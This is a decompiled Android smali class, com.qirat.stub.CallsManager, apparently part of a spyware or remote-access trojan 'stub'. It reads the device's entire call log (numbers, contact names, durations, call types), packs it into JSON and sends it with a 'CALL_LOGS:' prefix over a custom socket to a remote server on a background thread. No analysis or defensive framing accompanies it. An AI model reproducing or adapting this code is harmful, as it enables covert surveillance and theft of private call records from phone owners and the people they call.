.class public Lcom/qirat/stub/CallsManager;
.super Ljava/lang/Object;
.source "CallsManager.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "CallsManager"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 13
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getCallsLogs(Landroid/content/Context;)Lorg/json/JSONObject;
    .locals 15
    .param p0, "context"    # Landroid/content/Context;

    .line 18
    const-string v0, "type"

    const-string v1, "duration"

    const-string v2, "name"

    const-string v3, "CallsManager"

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 19
    .local v4, "calls":Lorg/json/JSONObject;
    new-instance v5, Lorg/json/JSONArray;

    invoke-direct {v5}, Lorg/json/JSONArray;-><init>()V

    .line 20
    .local v5, "list":Lorg/json/JSONArray;
    const/4 v6, 0x0

    .line 22
    .local v6, "cur":Landroid/database/Cursor;
    const/4 v7, 0x0

    :try_start_0
    const-string v8, "content://call_log/calls"

    invoke-static {v8}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v8

    move-object v10, v8

    .line 23
    .local v10, "allCalls":Landroid/net/Uri;
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v9

    const/4 v13, 0x0

    const/4 v14, 0x0

    const/4 v11, 0x0

    const/4 v12, 0x0

    invoke-virtual/range {v9 .. v14}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    move-object v6, v8

    .line 25
    if-nez v6, :cond_1

    .line 26
    const-string v0, "Cursor is null."

    invoke-static {v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 27
    nop

    .line 49
    if-eqz v6, :cond_0

    .line 50
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 27
    :cond_0
    return-object v7

    .line 30
    :cond_1
    :goto_0
    :try_start_1
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z

    move-result v8

    if-eqz v8, :cond_3

    .line 31
    new-instance v8, Lorg/json/JSONObject;

    invoke-direct {v8}, Lorg/json/JSONObject;-><init>()V

    .line 32
    .local v8, "call":Lorg/json/JSONObject;
    const-string v9, "number"

    invoke-interface {v6, v9}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v6, v9}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 33
    .local v9, "num":Ljava/lang/String;
    invoke-interface {v6, v2}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v11

    invoke-interface {v6, v11}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    .line 34
    .local v11, "name":Ljava/lang/String;
    invoke-interface {v6, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v12

    invoke-interface {v6, v12}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    .line 35
    .local v12, "duration":Ljava/lang/String;
    invoke-interface {v6, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v6, v13}, Landroid/database/Cursor;->getInt(I)I

    move-result v13

    .line 37
    .local v13, "type":I
    const-string v14, "phoneNo"

    invoke-virtual {v8, v14, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 38
    if-nez v11, :cond_2

    const-string v14, ""

    goto :goto_1

    :cond_2
    move-object v14, v11

    :goto_1
    invoke-virtual {v8, v2, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 39
    invoke-virtual {v8, v1, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 40
    invoke-virtual {v8, v0, v13}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 41
    invoke-virtual {v5, v8}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;

    .line 42
    nop

    .end local v8    # "call":Lorg/json/JSONObject;
    .end local v9    # "num":Ljava/lang/String;
    .end local v11    # "name":Ljava/lang/String;
    .end local v12    # "duration":Ljava/lang/String;
    .end local v13    # "type":I
    goto :goto_0

    .line 43
    :cond_3
    const-string v0, "callsList"

    invoke-virtual {v4, v0, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 44
    const-string v0, "Call logs collection complete."

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/IllegalArgumentException; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 45
    nop

    .line 49
    if-eqz v6, :cond_4

    .line 50
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 45
    :cond_4
    return-object v4

    .line 49
    .end local v10    # "allCalls":Landroid/net/Uri;
    :catchall_0
    move-exception v0

    goto :goto_3

    .line 46
    :catch_0
    move-exception v0

    goto :goto_2

    :catch_1
    move-exception v0

    .line 47
    .local v0, "e":Ljava/lang/Exception;
    :goto_2
    :try_start_2
    const-string v1, "Error getting call logs"

    invoke-static {v3, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 49
    nop

    .end local v0    # "e":Ljava/lang/Exception;
    if-eqz v6, :cond_5

    .line 50
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 53
    :cond_5
    return-object v7

    .line 49
    :goto_3
    if-eqz v6, :cond_6

    .line 50
    invoke-interface {v6}, Landroid/database/Cursor;->close()V

    .line 52
    :cond_6
    throw v0
.end method

.method static synthetic lambda$sendCallLogsToServer$0(Landroid/content/Context;)V
    .locals 4
    .param p0, "context"    # Landroid/content/Context;

    .line 62
    invoke-static {p0}, Lcom/qirat/stub/CallsManager;->getCallsLogs(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v0

    .line 63
    .local v0, "callLogs":Lorg/json/JSONObject;
    const-string v1, "CallsManager"

    if-nez v0, :cond_0

    .line 64
    const-string v2, "Cannot send call logs, the collected list is null."

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 65
    return-void

    .line 69
    :cond_0
    invoke-static {p0}, Lcom/qirat/stub/Socket;->getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;

    move-result-object v2

    .line 70
    .local v2, "socket":Lcom/qirat/stub/Socket;
    invoke-virtual {v2}, Lcom/qirat/stub/Socket;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 71
    const-string v3, "Sending call logs to server..."

    invoke-static {v1, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 72
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "CALL_LOGS:"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    goto :goto_0

    .line 74
    :cond_1
    const-string v3, "Cannot send call logs, socket not connected."

    invoke-static {v1, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 76
    :goto_0
    return-void
.end method

.method public static sendCallLogsToServer(Landroid/content/Context;)V
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .line 61
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/qirat/stub/CallsManager$$ExternalSyntheticLambda0;

    invoke-direct {v1, p0}, Lcom/qirat/stub/CallsManager$$ExternalSyntheticLambda0;-><init>(Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 76
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 77
    return-void
.end method
